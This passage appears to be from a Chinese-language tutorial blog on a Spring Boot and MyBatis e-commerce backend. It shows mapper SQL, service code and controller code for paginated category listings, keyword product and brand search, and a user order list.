<span class="hljs-keyword">public</span> ResultVO <span class="hljs-title function_">getListBrands</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable(&quot;cid&quot;)</span> String cid)</span>&#123;
    <span class="hljs-keyword">return</span> productService.listBrands(Integer.parseInt(cid));
&#125;</code></pre>

<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220716105333765.png" alt="image-20220716105333765"></p>
</li>
</ul>
<h4 id="根据分类和品牌分页查询商品"><a href="#根据分类和品牌分页查询商品" class="headerlink" title="根据分类和品牌分页查询商品"></a>根据分类和品牌分页查询商品</h4><table>
<thead>
<tr>
<th>请求url</th>
<th>响应结果</th>
</tr>
</thead>
<tbody><tr>
<td>product&#x2F;listbycid&#x2F;49?pageNum&#x3D;1&amp;limit&#x3D;4</td>
<td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220716105625379.png" alt="image-20220716105625379"></td>
</tr>
</tbody></table>
<ul>
<li><p>sql</p>
<p>由响应数据可以看出是分页查询，并且将商品的价格最低的sku一起返回</p>
<pre><code class="hljs mysql">select * from product_sku where prodoct_id = 1 ORDER BY  sell_price limit 0,1
select * from product where category_id = 49</code></pre>
</li>
<li><p>dao</p>
<pre><code class="hljs java"> * 根据三级分类ID分页查询商品信息
 * <span class="hljs-meta">@param</span> cid 三级分类id
 * <span class="hljs-meta">@param</span> start 起始索引
 * <span class="hljs-meta">@param</span> limit 查询记录数
 * <span class="hljs-meta">@return</span>
 */
<span class="hljs-keyword">public</span> List&lt;ProductVO&gt; <span class="hljs-title function_">selectProductByCategoryId</span><span class="hljs-params">(<span class="hljs-meta">@Param(&quot;cid&quot;)</span> <span class="hljs-type">int</span> cid,</span>
<span class="hljs-params">                                                 <span class="hljs-meta">@Param(&quot;start&quot;)</span> <span class="hljs-type">int</span> start,</span>
<span class="hljs-params">                                                 <span class="hljs-meta">@Param(&quot;limit&quot;)</span> <span class="hljs-type">int</span> limit)</span>;</code></pre>

<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">resultMap</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;ProductVOMap2&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;com.qfedu.fmmall.entity.ProductVO&quot;</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">id</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;product_id&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;productId&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;product_name&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;productName&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;category_id&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;INTEGER&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;categoryId&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;root_category_id&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;INTEGER&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;rootCategoryId&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;sold_num&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;INTEGER&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;soldNum&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;product_status&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;INTEGER&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;productStatus&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;create_time&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;TIMESTAMP&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;createTime&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;update_time&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;TIMESTAMP&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;updateTime&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;content&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;LONGVARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;content&quot;</span> /&gt;</span>
  <span class="hljs-comment">&lt;!--  根据商品ID查询价格最低的套餐  --&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">collection</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;skus&quot;</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;product_id&quot;</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;com.qfedu.fmmall.dao.ProductSkuMapper.selectLowerestPriceByProductId&quot;</span>/&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">resultMap</span>&gt;</span>
  
<span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;selectProductByCategoryId&quot;</span> <span class="hljs-attr">resultMap</span>=<span class="hljs-string">&quot;ProductVOMap2&quot;</span>&gt;</span>
  select  product_id,
          product_name,
          category_id,
          root_category_id,
          sold_num,
          product_status,
          content,
          create_time,
          update_time
  from product
  where category_id=#&#123;cid&#125;
  limit #&#123;start&#125;,#&#123;limit&#125;
<span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span></code></pre>

<p>selectLowerestPriceByProductId</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">resultMap</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;BaseResultMap&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;com.qfedu.fmmall.entity.ProductSku&quot;</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">id</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;sku_id&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;skuId&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;product_id&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;productId&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;sku_name&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;skuName&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;sku_img&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;skuImg&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;untitled&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;untitled&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;original_price&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;INTEGER&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;originalPrice&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;sell_price&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;INTEGER&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;sellPrice&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;discounts&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;DECIMAL&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;discounts&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;stock&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;INTEGER&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;stock&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;create_time&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;TIMESTAMP&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;createTime&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;update_time&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;TIMESTAMP&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;updateTime&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;status&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;INTEGER&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;status&quot;</span> /&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">resultMap</span>&gt;</span>
  
<span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;selectLowerestPriceByProductId&quot;</span> <span class="hljs-attr">resultMap</span>=<span class="hljs-string">&quot;BaseResultMap&quot;</span>&gt;</span>
  select  sku_id,product_id,sku_name, sku_img,untitled,original_price,sell_price,
    discounts,stock,create_time,update_time,status
  from product_sku
  where product_id = #&#123;productId&#125;
  ORDER BY  sell_price limit 0,1
<span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span></code></pre>
</li>
<li><p>service</p>
<pre><code class="hljs java"><span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> ResultVO <span class="hljs-title function_">getProductsByCategoryId</span><span class="hljs-params">(<span class="hljs-type">int</span> categoryId, <span class="hljs-type">int</span> pageNum, <span class="hljs-type">int</span> limit)</span> &#123;
    <span class="hljs-comment">//1.查询分页数据</span>
    <span class="hljs-type">int</span> <span class="hljs-variable">start</span> <span class="hljs-operator">=</span> (pageNum-<span class="hljs-number">1</span>)*limit;
    List&lt;ProductVO&gt; productVOS = productMapper.selectProductByCategoryId(categoryId, start, limit);
    <span class="hljs-comment">//2.查询当前类别下的商品的总记录数</span>
    <span class="hljs-type">Example</span> <span class="hljs-variable">example</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Example</span>(Product.class);
    Example.<span class="hljs-type">Criteria</span> <span class="hljs-variable">criteria</span> <span class="hljs-operator">=</span> example.createCriteria();
    criteria.andEqualTo(<span class="hljs-string">&quot;categoryId&quot;</span>,categoryId);
    <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> productMapper.selectCountByExample(example);
    <span class="hljs-comment">//3.计算总页数</span>
    <span class="hljs-type">int</span> <span class="hljs-variable">pageCount</span> <span class="hljs-operator">=</span> count%limit==<span class="hljs-number">0</span>? count/limit : count/limit+<span class="hljs-number">1</span>;
    <span class="hljs-comment">//4.封装返回数据</span>
    PageHelper&lt;ProductVO&gt; pageHelper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PageHelper</span>&lt;&gt;(count, pageCount, productVOS);
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResultVO</span>(ResStatus.OK,<span class="hljs-string">&quot;SUCCESS&quot;</span>,pageHelper);
&#125;</code></pre>
</li>
<li><p>controller</p>
<pre><code class="hljs java"><span class="hljs-meta">@ApiOperation(&quot;商品品牌分页查询接口&quot;)</span>
<span class="hljs-meta">@GetMapping(&quot;/listbycid/&#123;cid&#125;&quot;)</span>
<span class="hljs-keyword">public</span> ResultVO <span class="hljs-title function_">getProductsByCategoryId</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable(&quot;cid&quot;)</span> String cid,</span>
<span class="hljs-params">                                        <span class="hljs-meta">@RequestParam(&quot;pageNum&quot;)</span> <span class="hljs-type">int</span> pageNum,</span>
<span class="hljs-params">                                        <span class="hljs-meta">@RequestParam(&quot;limit&quot;)</span> <span class="hljs-type">int</span> limit)</span>&#123;
    <span class="hljs-keyword">return</span> productService.getProductsByCategoryId(Integer.parseInt(cid), pageNum, limit);
&#125;</code></pre>



<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220716114341669.png" alt="image-20220716114341669"></p>
</li>
</ul>
<h3 id="1-13-关键字搜索商品"><a href="#1-13-关键字搜索商品" class="headerlink" title="1.13 关键字搜索商品"></a>1.13 关键字搜索商品</h3><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220716114519584.png" alt="image-20220716114519584"></p>
<h4 id="搜索相关商品的品牌"><a href="#搜索相关商品的品牌" class="headerlink" title="搜索相关商品的品牌"></a>搜索相关商品的品牌</h4><ul>
<li><p>dao</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;selectBrandByKeyword&quot;</span> <span class="hljs-attr">resultSets</span>=<span class="hljs-string">&quot;java.util.List&quot;</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">&quot;String&quot;</span>&gt;</span>
    select DISTINCT brand
    from product_params
    where product_id in (
    select product_id
    from product
    where product_name like #&#123;kw&#125;
    )
<span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span></code></pre>
</li>
<li><p>service</p>
<pre><code class="hljs java"><span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> ResultVO <span class="hljs-title function_">listBrands</span><span class="hljs-params">(String kw)</span> &#123;
    kw = <span class="hljs-string">&quot;%&quot;</span>+kw+<span class="hljs-string">&quot;%&quot;</span>;
    List&lt;String&gt; brands = productMapper.selectBrandByKeyword(kw);
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResultVO</span>(ResStatus.OK,<span class="hljs-string">&quot;SUCCESS&quot;</span>,brands);
&#125;</code></pre></li>
</ul>
<h4 id="搜索出包含关键词的商品"><a href="#搜索出包含关键词的商品" class="headerlink" title="搜索出包含关键词的商品"></a>搜索出包含关键词的商品</h4><ul>
<li><p>dao</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;selectProductByKeyword&quot;</span> <span class="hljs-attr">resultMap</span>=<span class="hljs-string">&quot;ProductVOMap2&quot;</span>&gt;</span>
    select  product_id,
    product_name,
    category_id,
    root_category_id,
    sold_num,
    product_status,
    content,
    create_time,
    update_time
    from product
    where product_name like #&#123;kw&#125;
    limit #&#123;start&#125;,#&#123;limit&#125;
<span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span></code></pre>
</li>
<li><p>service</p>
<pre><code class="hljs java"><span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> ResultVO <span class="hljs-title function_">searchProduct</span><span class="hljs-params">(String kw, <span class="hljs-type">int</span> pageNum, <span class="hljs-type">int</span> limit)</span> &#123;
    <span class="hljs-comment">//1.查询搜索结果</span>
    kw = <span class="hljs-string">&quot;%&quot;</span>+kw+<span class="hljs-string">&quot;%&quot;</span>;
    <span class="hljs-type">int</span> <span class="hljs-variable">start</span> <span class="hljs-operator">=</span> (pageNum-<span class="hljs-number">1</span>)*limit;
    List&lt;ProductVO&gt; productVOS = productMapper.selectProductByKeyword(kw, start, limit);

    <span class="hljs-comment">//2.查询总记录数</span>
    <span class="hljs-type">Example</span> <span class="hljs-variable">example</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Example</span>(Product.class);
    Example.<span class="hljs-type">Criteria</span> <span class="hljs-variable">criteria</span> <span class="hljs-operator">=</span> example.createCriteria();
    criteria.andLike(<span class="hljs-string">&quot;productName&quot;</span>,kw);
    <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> productMapper.selectCountByExample(example);

    <span class="hljs-comment">//3.计算总页数</span>
    <span class="hljs-type">int</span> <span class="hljs-variable">pageCount</span> <span class="hljs-operator">=</span> count%limit==<span class="hljs-number">0</span>? count/limit:count/limit+<span class="hljs-number">1</span>;

    <span class="hljs-comment">//4.封装，返回数据</span>
    PageHelper&lt;ProductVO&gt; pageHelper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PageHelper</span>&lt;&gt;(count, pageCount, productVOS);
    <span class="hljs-type">ResultVO</span> <span class="hljs-variable">resultVO</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResultVO</span>(ResStatus.OK, <span class="hljs-string">&quot;SUCCESS&quot;</span>, pageHelper);
    <span class="hljs-keyword">return</span> resultVO;
&#125;</code></pre></li>
</ul>
<h3 id="1-14-个人中心"><a href="#1-14-个人中心" class="headerlink" title="1.14 个人中心"></a>1.14 个人中心</h3><h4 id="显示所有订单"><a href="#显示所有订单" class="headerlink" title="显示所有订单"></a>显示所有订单</h4><blockquote>
<p>order&#x2F;list?userId&#x3D;15&amp;pageNum&#x3D;1&amp;limit&#x3D;5&amp;status&#x3D;1</p>
</blockquote>
<ul>
<li><p>dao</p>
<p>OrdersMapper</p>
<pre><code class="hljs java"><span class="hljs-keyword">public</span> List&lt;OrdersVO&gt; <span class="hljs-title function_">selectOrders</span><span class="hljs-params">(<span class="hljs-meta">@Param(&quot;userId&quot;)</span> String userId,</span>
<span class="hljs-params">                                   <span class="hljs-meta">@Param(&quot;status&quot;)</span> String status,</span>
<span class="hljs-params">                                   <span class="hljs-meta">@Param(&quot;start&quot;)</span> <span class="hljs-type">int</span> start,</span>
<span class="hljs-params">                                   <span class="hljs-meta">@Param(&quot;limit&quot;)</span> <span class="hljs-type">int</span> limit)</span>;</code></pre>

<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">resultMap</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;OrdersVOMap&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;com.qfedu.fmmall.entity.OrdersVO&quot;</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">id</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;order_id&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;orderId&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;user_id&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;userId&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;untitled&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;untitled&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;receiver_name&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;receiverName&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;receiver_mobile&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;receiverMobile&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;receiver_address&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;receiverAddress&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;total_amount&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;DECIMAL&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;totalAmount&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;actual_amount&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;INTEGER&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;actualAmount&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;pay_type&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;INTEGER&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;payType&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;order_remark&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;orderRemark&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;status&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;status&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;delivery_type&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;deliveryType&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;delivery_flow_id&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;deliveryFlowId&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;order_freight&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;DECIMAL&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;orderFreight&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;delete_status&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;INTEGER&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;deleteStatus&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;create_time&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;TIMESTAMP&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;createTime&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;update_time&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;TIMESTAMP&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;updateTime&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;pay_time&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;TIMESTAMP&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;payTime&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;delivery_time&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;TIMESTAMP&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;deliveryTime&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;flish_time&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;TIMESTAMP&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;flishTime&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;cancel_time&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;TIMESTAMP&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;cancelTime&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;close_type&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;INTEGER&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;closeType&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">collection</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;orderItems&quot;</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;order_id&quot;</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;com.qfedu.fmmall.dao.OrderItemMapper.listOrderItemsByOrderId&quot;</span>/&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">resultMap</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;selectOrders&quot;</span> <span class="hljs-attr">resultMap</span>=<span class="hljs-string">&quot;OrdersVOMap&quot;</span>&gt;</span>
    select
    order_id,user_id,untitled,receiver_name, receiver_mobile,receiver_address,
    total_amount, actual_amount,pay_type,order_remark,status,delivery_type,
    delivery_flow_id,order_freight,delete_status,create_time,
    update_time,pay_time,delivery_time, flish_time,cancel_time,close_type
    from orders
    where user_id=#&#123;userId&#125;
    <span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;status != null&quot;</span>&gt;</span>
      and status=#&#123;status&#125;
    <span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span>
    limit #&#123;start&#125;,#&#123;limit&#125;
  <span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span></code></pre>

<p>OrderItemMapper</p>
<pre><code class="hljs java"><span class="hljs-keyword">public</span> List&lt;OrderItem&gt; <span class="hljs-title function_">listOrderItemsByOrderId</span><span class="hljs-params">(String orderId)</span>;</code></pre>

<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">resultMap</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;BaseResultMap&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;com.qfedu.fmmall.entity.OrderItem&quot;</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">id</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;item_id&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;itemId&quot;</span> /&gt;</span>
